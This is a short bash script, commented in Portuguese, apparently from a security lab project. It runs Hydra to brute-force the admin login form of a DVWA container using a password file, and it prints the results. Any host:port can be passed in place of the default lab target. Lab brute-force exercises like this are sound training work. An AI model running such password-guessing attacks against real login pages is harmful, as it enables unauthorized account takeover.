#!/usr/bin/env bash
#
# denis-play-backend/plays/play-02-hydra-dvwa/run.sh

# Vai para a pasta deste script
cd "$(dirname "$0")"

# Sem parâmetro, ataca sempre o serviço 'dvwa' na porta 80 da rede compose
TARGET=${1:-dvwa:80}

echo "[*] Iniciando ataque com Hydra contra $TARGET..."
sleep 1

# Separa host e porta
HOST=${TARGET%%:*}
PORT=${TARGET#*:}

# Executa Hydra no módulo correto (formulário HTTP POST) contra o DVWA
hydra -l admin \
      -P passwords.txt \
      -s "$PORT" \
      "$HOST" http-form-post \
      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
      -t 4 -V > resultado.txt

echo
echo "[📄] Saída do Hydra:"
cat resultado.txt
echo
echo "[✔️] Teste concluído com sucesso."
